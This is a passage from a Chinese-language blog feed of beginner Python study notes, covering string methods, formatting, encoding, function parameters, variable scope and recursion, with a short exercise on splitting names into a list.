class="hljs-built_in">print</span>(s.zfill(20))#00000000hello,Python<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'-8910'</span>.zfill(8))#-0008910<br></code></pre></td></tr></tbody></table></figure><h3 id="劈分"><a href="#劈分" class="headerlink" title="劈分"></a>劈分</h3><ul><li>split() 从字符串左边开始劈分，默认以空格劈分，返回结果为列表；以参数sep指定分隔符；以参数maxsplit指定分隔最大次数</li><li>rsplit() 从右边开始劈分</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello world Python'</span><br>l=s<span class="hljs-selector-class">.split</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span>#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br>s1=<span class="hljs-string">'hello|world|Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.split(sep=<span class="hljs-string">'|'</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.split(sep=<span class="hljs-string">'|'</span>,maxsplit=<span class="hljs-number">1</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world|Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.split()</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.rsplit(sep=<span class="hljs-string">'|'</span>,maxsplit=<span class="hljs-number">1</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello|world'</span>, <span class="hljs-string">'Python'</span>]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="判断字符串操作"><a href="#判断字符串操作" class="headerlink" title="判断字符串操作"></a>判断字符串操作</h3><ul><li>isidentifier() 是否合法标识符（字母数字下划线）</li><li>isspace() 是否全是空格</li><li>isalpha() 是否全是字母</li><li>isdecimal() 是否全是十进制数字</li><li>isnumeric() 是否全是数字</li><li>isalnum() 是否全是数字和字母组成</li></ul><h3 id="替换合并"><a href="#替换合并" class="headerlink" title="替换合并"></a>替换合并</h3><ul><li>replace() 字符串替换</li><li>join() 河滨，列表或元组中字符串合并为一个字符串</li></ul><figure class="highlight axapta"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs axapta">s=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-keyword">print</span>(s.replace(<span class="hljs-string">'Python'</span>,<span class="hljs-string">'Java'</span>))<span class="hljs-meta">#hello,Java</span><br>s1=<span class="hljs-string">'hello,Python,Python,Python'</span><br><span class="hljs-keyword">print</span>(s.replace(<span class="hljs-string">'Python'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-number">2</span>))<span class="hljs-meta">#hello,Java</span><br>lst=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'java'</span>,<span class="hljs-string">'python'</span>]<br><span class="hljs-keyword">print</span>(<span class="hljs-string">'|'</span>.<span class="hljs-keyword">join</span>(lst))<span class="hljs-meta">#hello|java|python</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(lst))<span class="hljs-meta">#hellojavapython</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">'*'</span>.<span class="hljs-keyword">join</span>(<span class="hljs-string">'Python'</span>))<span class="hljs-meta">#P*y*t*h*o*n</span><br></code></pre></td></tr></tbody></table></figure><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>运算符<code>&gt; &gt;= &lt; &lt;= == !=</code></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'apple'</span>&gt;<span class="hljs-string">'app'</span>)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'apple'</span>&gt;<span class="hljs-string">'banana'</span>)</span></span><span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(ord(<span class="hljs-string">'a'</span>)</span></span>,<span class="hljs-built_in">ord</span>(<span class="hljs-string">'b'</span>))#<span class="hljs-number">97</span> <span class="hljs-number">98</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(chr(<span class="hljs-number">97</span>)</span></span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-id">#a</span> b<br></code></pre></td></tr></tbody></table></figure><p>‘==’ 比较 value</p><p>‘is’ 比较 id</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=b=<span class="hljs-string">'Python'</span><br>c=<span class="hljs-string">'Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a==b)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b==c)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(a)</span></span>,<span class="hljs-built_in">id</span>(b),<span class="hljs-built_in">id</span>(c))#<span class="hljs-number">1621331059952</span> <span class="hljs-number">1621331059952</span> <span class="hljs-number">1621331059952</span><br></code></pre></td></tr></tbody></table></figure><h3 id="切片-start-end-step"><a href="#切片-start-end-step" class="headerlink" title="切片 [start:end:step]"></a>切片 [start<span class="github-emoji"><span>🔚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f51a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>step]</h3><p>字符串不可变，切片后将产生新对象</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'hello,python'</span><br><span class="hljs-attribute">s1</span>=s[:5]<br><span class="hljs-attribute">s2</span>=s[6:]<br><span class="hljs-attribute">s3</span>=<span class="hljs-string">'!'</span><br><span class="hljs-attribute">newstr</span>=s1+s3+s2<br><span class="hljs-built_in">print</span>(s1)#hello<br><span class="hljs-built_in">print</span>(s2)#python<br><span class="hljs-built_in">print</span>(s3)#!<br><span class="hljs-built_in">print</span>(newstr)#hello!python<br></code></pre></td></tr></tbody></table></figure><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul><li>%作占位符 <code>'我叫%s'%(name)</code></li><li>{}作占位符 <code>'我叫{0},今年{1}岁，我真的是{0}'.format(name,age)</code></li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span><br><span class="hljs-attribute">age</span>=20<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫%s,今年%d岁'</span>%(name,age))#我叫张三，今年20岁<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫{0},今年{1}岁'</span>.format(name,age))<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">'我叫{name},今年{age}岁'</span>)<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>('%<span class="hljs-number">10</span>d'%<span class="hljs-number">99</span>)#        <span class="hljs-number">99</span>;<span class="hljs-number">10</span>表示宽度<br><span class="hljs-attribute">print</span>('%.<span class="hljs-number">3</span>f'%<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)#<span class="hljs-number">3</span>.<span class="hljs-number">142</span>；#.<span class="hljs-number">3</span>表示小数点后三位<br><span class="hljs-attribute">print</span>('%<span class="hljs-number">10</span>.<span class="hljs-number">3</span>f'%<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)#     <span class="hljs-number">3</span>.<span class="hljs-number">142</span><br><span class="hljs-attribute">print</span>(' ---- ')<br><span class="hljs-attribute">print</span>('{<span class="hljs-number">0</span>:.<span class="hljs-number">3</span>f}'.format(<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)) #<span class="hljs-number">3</span>.<span class="hljs-number">142</span><br><span class="hljs-attribute">print</span>('{<span class="hljs-number">0</span>:<span class="hljs-number">10</span>.<span class="hljs-number">3</span>f}'.format(<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>))#     <span class="hljs-number">3</span>.<span class="hljs-number">142</span><br></code></pre></td></tr></tbody></table></figure><h2 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h2><p>编码：字符串转二进制</p><p>解码：二进制转字符串</p><p>GBK中，一个中文占两个字节；UTF-8中，一个中文占三个字节</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'天涯共此时'</span><br><span class="hljs-built_in">print</span>(s.encode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">'GBK'</span>))#b'\xcc\xec\xd1\xc4\xb9\xb2\xb4\xcb\xca\xb1'<br><span class="hljs-attribute">byte</span>=s.encode(encoding='GBK')<br><span class="hljs-built_in">print</span>(byte.decode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">"GBK"</span>))#天涯共此时<br></code></pre></td></tr></tbody></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="创建，调用"><a href="#创建，调用" class="headerlink" title="创建，调用"></a>创建，调用</h2><p>（1）函数作用：复用代码，隐藏实现细节，提高可维护性，提高可读性便于调试</p><p>（2）创建：<code>def 函数名([参数]):</code><br>                <code>函数体</code></p><p>（3）调用：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def calc(<span class="hljs-keyword">a</span>,b): <span class="hljs-comment">#a,b为形参，在函数定义处</span><br>    c=<span class="hljs-keyword">a</span>+b<br>    <span class="hljs-literal">return</span> c<br><span class="hljs-built_in">result</span>=calc(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#10，20是实参，在函数调用处</span><br>print(<span class="hljs-built_in">result</span>) <span class="hljs-comment">#30</span><br></code></pre></td></tr></tbody></table></figure><h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>（1）位置实参：对应位置进行参数传递</p><p>（2）关键字实参：对应名称进行参数传递</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">result</span>=calc(<span class="hljs-keyword">a</span>=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>)<br>print(<span class="hljs-built_in">result</span>) <span class="hljs-comment">#30</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(arg1,arg2):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg1'</span>,arg1)#arg1 11<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg2'</span>,arg2)#arg2 [22, 33, 44]<br>    <span class="hljs-attribute">arg1</span>=100<br>    arg2.append(10)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg1'</span>,arg1)#arg1 100<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg2'</span>,arg2)#arg2 [22, 33, 44, 10]<br><span class="hljs-attribute">n1</span>=11<br>n2=[22,33,44]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n1'</span>,n1)#n1 11<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n2'</span>,n2)#n2 [22, 33, 44]<br>fun(n1,n2)#跳到fun()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n1'</span>,n1)#n1 11<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n2'</span>,n2)#n2 [22, 33, 44, 10]<br></code></pre></td></tr></tbody></table></figure><blockquote><p>在函数调用过程中，进行参数传递，若是不可变对象，在函数体的修改不会影响实参的值；若可变则会影响</p></blockquote><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>（1）返回值有多个时，结果将以元组形式返回</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(num)</span></span>:<br>    odd=[]#存储奇数<br>    even=[]#存储偶数<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> num:<br>        <span class="hljs-keyword">if</span> i %<span class="hljs-number">2</span>:<br>            odd.append(i)<br>        <span class="hljs-keyword">else</span>:<br>            even.append(i)<br>    <span class="hljs-keyword">return</span> odd,even<br>lst=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">39</span>,<span class="hljs-number">43</span>,<span class="hljs-number">66</span>,<span class="hljs-number">24</span>]<br>print(<span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(lst)</span></span>)#([<span class="hljs-number">39</span>, <span class="hljs-number">43</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">66</span>, <span class="hljs-number">24</span>])<br></code></pre></td></tr></tbody></table></figure><p>（2）如果返回值没有（函数执行后不需要给调用出提供数据），return可省略；</p><p>若返回值为1个，则直接返回类型；</p><p>若返回值为多个，则返回为元组；</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">fun1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'hello'</span>)<br><span class="hljs-built_in">fun1</span>()#hello<br>def <span class="hljs-built_in">fun2</span>():<br>    return <span class="hljs-string">'hello'</span><br>result=<span class="hljs-built_in">fun2</span>()<br><span class="hljs-built_in">print</span>(result)#hello<br>def <span class="hljs-built_in">fun3</span>():<br>    return <span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">fun3</span>())#(<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h2><p>（1）默认值</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a,b=<span class="hljs-number">10</span>)</span></span>:<br>    print(a,b)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">100</span>)</span></span>#<span class="hljs-number">100</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)</span></span>#<span class="hljs-number">20</span> <span class="hljs-number">30</span><br></code></pre></td></tr></tbody></table></figure><p>（2）个数可变的位置参数（只可为一个），用*定义可变的形参，结果为元组</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(*args)</span></span>:<br>    print(args)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>#(<span class="hljs-number">10</span>,)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)</span></span>#(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>)<br></code></pre></td></tr></tbody></table></figure><p>（3）个数可变的关键字形参（只可为一个），用**定义可变的形参，结果为字典</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(**args)</span></span>:<br>    print(args)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a=<span class="hljs-number">10</span>)</span></span>#{<span class="hljs-string">'a'</span>: <span class="hljs-number">10</span>}<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>,c=<span class="hljs-number">30</span>)</span></span>#{<span class="hljs-string">'a'</span>: <span class="hljs-number">10</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'c'</span>: <span class="hljs-number">30</span>}<br></code></pre></td></tr></tbody></table></figure><blockquote><p>函数定义中，二者同为形参时，位置参数放在关键字参数之前</p></blockquote><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,b,c):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br>fun(10,20,30)#位置传参#<span class="hljs-attribute">a</span>=10 <span class="hljs-attribute">b</span>=20 <span class="hljs-attribute">c</span>=30<br>lst=[11,22,33]<br>fun(*lst)#列表中元素转位置参数传入#<span class="hljs-attribute">a</span>=11 <span class="hljs-attribute">b</span>=22 <span class="hljs-attribute">c</span>=33<br>fun(<span class="hljs-attribute">a</span>=100,b=200,c=300)#a=100 <span class="hljs-attribute">b</span>=200 <span class="hljs-attribute">c</span>=300<br>dict={<span class="hljs-string">'a'</span>:111,<span class="hljs-string">'b'</span>:222,<span class="hljs-string">'c'</span>:333}<br>fun(*<span class="hljs-number">*d</span>ict)#字典中键值对转关键字参数传入#<span class="hljs-attribute">a</span>=111 <span class="hljs-attribute">b</span>=222 <span class="hljs-attribute">c</span>=333<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,<span class="hljs-attribute">b</span>=10):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>def fun2(<span class="hljs-number">*a</span>rgs):<br>    <span class="hljs-built_in">print</span>(args)<br>def fun3(*<span class="hljs-number">*a</span>rgs):<br>    <span class="hljs-built_in">print</span>(args)<br>fun2(10,20,30,40)#(10, 20, 30, 40)<br>fun3(<span class="hljs-attribute">a</span>=11,b=22,c=33,d=44,e=55)#{<span class="hljs-string">'a'</span>: 11, <span class="hljs-string">'b'</span>: 22, <span class="hljs-string">'c'</span>: 33, <span class="hljs-string">'d'</span>: 44, <span class="hljs-string">'e'</span>: 55}<br>def fun4(a,b,c,d):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'d='</span>,d)<br>fun4(10,20,30,40)#<span class="hljs-attribute">a</span>=10 <span class="hljs-attribute">b</span>=20 <span class="hljs-attribute">c</span>=30 <span class="hljs-attribute">d</span>=40<br>fun4(<span class="hljs-attribute">a</span>=11,b=22,c=33,d=44)#a=11 <span class="hljs-attribute">b</span>=22 <span class="hljs-attribute">c</span>=33 <span class="hljs-attribute">d</span>=44<br>fun4(100,200,<span class="hljs-attribute">c</span>=300,d=400)#a=100 <span class="hljs-attribute">b</span>=200 <span class="hljs-attribute">c</span>=300 <span class="hljs-attribute">d</span>=400<br></code></pre></td></tr></tbody></table></figure><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><p>代码可访问该变量的区域</p><p>有效范围：</p><p>（1）局部变量：global声明可将局部变量转为全局变量；局部变量仅在函数体内部有效</p><p>（2）全局变量：函数体外定义的变量，函数体内外都可调用</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,b):<br>    <span class="hljs-attribute">c</span>=a+b #c为局部变量<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span>#name为全局变量<br><span class="hljs-built_in">print</span>(name)<br>def fun1():<br>    <span class="hljs-built_in">print</span>(name)<br>fun1()#张三<br>def fun2():<br>    global age<br>    <span class="hljs-attribute">age</span>=20<br>    <span class="hljs-built_in">print</span>(age)<br>fun2()<br><span class="hljs-built_in">print</span>(age)<br></code></pre></td></tr></tbody></table></figure><h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>（1）一个函数在函数体内调用本身，即为递归</p><p>（2）组成：递归调用与终止条件</p><p>（3）每递归调用一次，就在栈内分配一个战阵，执行完之后再释放</p><p>（4）优点：思路代码简单；缺点：占用内存多，效率低</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fac</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> n*fac(n-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(fac(<span class="hljs-number">6</span>))<span class="hljs-comment">#720</span><br></code></pre></td></tr></tbody></table></figure><p>斐波那契数列：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(n):<br>    <span class="hljs-attribute">if</span> n==<span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-attribute">elif</span> n==<span class="hljs-number">2</span>:<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">return</span> fib(n-<span class="hljs-number">1</span>)+fib(n-<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(fib(<span class="hljs-number">8</span>))#<span class="hljs-number">21</span><br> <span class="hljs-comment">#输出前六位</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>):<br>    <span class="hljs-attribute">print</span>(fib(i))#<span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span> <span class="hljs-number">8</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python学习随笔记录</title>
    <link href="/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/09/11/python%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<ul><li>strip() 删除两边空格</li><li>lstrip() 删除左边空格</li><li>rstrip() 删除右边空格</li><li>replace(“ “,””) 删除所有空格</li><li>split() 先切分</li><li>join() 再拼接</li></ul><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>描述</p><p>一串连续的数据用什么记录最合适，牛牛认为在Python中非列表（list）莫属了。现输入牛牛朋友们的名字，请使用list函数与split函数将它们封装成列表，再整个输出列表。</p><p>输入描述：</p><p>输入一串字符串，它们之间通过空格间隔开。</p><p>输出描述：</p><p>输出封装后的列表。</p><p>示例1</p><p>输入：<code>NiuNiu NiuMei NiuNeng</code></p><p>输出：<code>['NiuNiu', 'NiuMei', 'NiuNeng']</code></p><p>解：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">name=<span class="hljs-selector-tag">input</span>()<span class="hljs-selector-class">.split</span>(<span class="hljs-string">" "</span>)<br>name_list=<span class="hljs-built_in">list</span>()<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> name:<br>    name_list<span class="hljs-selector-class">.append</span>(i)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(name_list)</span></span><br></code></pre></td></tr></tbody></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><ul><li>bin(x) 转二进制</li><li>hex(x) 转十六进制</li><li>ord(x) 字母转数字</li><li>abs(x) 转绝对值</li><li>sum(x) 算数和</li><li>max(x) 最大值</li><li>min(x) 最小值</li><li>count() 计数</li><li>pow() 幂乘 x**y=pow(x,y)</li><li>x.isalpha() 判断字符串中是否只包含字母</li><li>x.isdigit() 判断字符串中是否只包含数字</li><li>x.isspace() 判断字符串中是否只包含空格</li><li>find() 查找字符串</li><li>round(f,n) 输出f四舍五入保留至n位小数后的结果</li><li>eval() 公式计算器</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习5</title>
    <link href="/2022/09/06/python%E5%AD%A6%E4%B9%A05/"/>
    <url>/2022/09/06/python%E5%AD%A6%E4%B9%A05/</url>
    
